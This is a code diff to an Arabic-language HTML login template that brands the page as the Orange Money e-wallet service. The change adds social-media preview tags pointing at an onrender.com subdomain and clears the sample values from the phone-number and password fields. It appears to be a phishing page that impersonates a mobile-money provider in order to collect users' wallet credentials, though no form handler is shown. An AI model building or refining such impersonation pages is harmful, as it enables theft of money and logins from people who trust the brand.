@@ -1,9 +1,22 @@
 <!doctype html>
 <html lang="ar" dir="rtl">
 <head>
+
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>الصفحة الرئيسية</title>
+  <title>خدمة Orange Money | محفظة إلكترونية</title>
+
+  <meta property="og:title" content="خدمة Orange Money | محفظة إلكترونية">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="https://o-5k7b.onrender.com/static/frontend/images/og-image.webp">
+  <meta property="og:image:type" content="image/webp">
+  <meta property="og:image:alt" content="خدمة Orange Money | محفظة إلكترونية">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="خدمة Orange Money | محفظة إلكترونية">
+  <meta name="twitter:image" content="https://o-5k7b.onrender.com/static/frontend/images/og-image.webp">
+  <meta name="twitter:image:alt" content="خدمة Orange Money | محفظة إلكترونية">
+
   <style>
     @font-face {
       font-family: "Cairo";
@@ -628,7 +641,6 @@
             inputmode="numeric"
             autocomplete="tel"
             maxlength="10"
-            value="0791234567"
             required
           >
         </label>
@@ -644,7 +656,6 @@
             type="password"
             autocomplete="current-password"
             minlength="6"
-            value="123456"
             required
           >
           <img class="field-icon" id="password-toggle" src="{{ url_for('static', path='frontend/images/ic_eye_hidden.svg') }}" alt="إظهار كلمة السر">
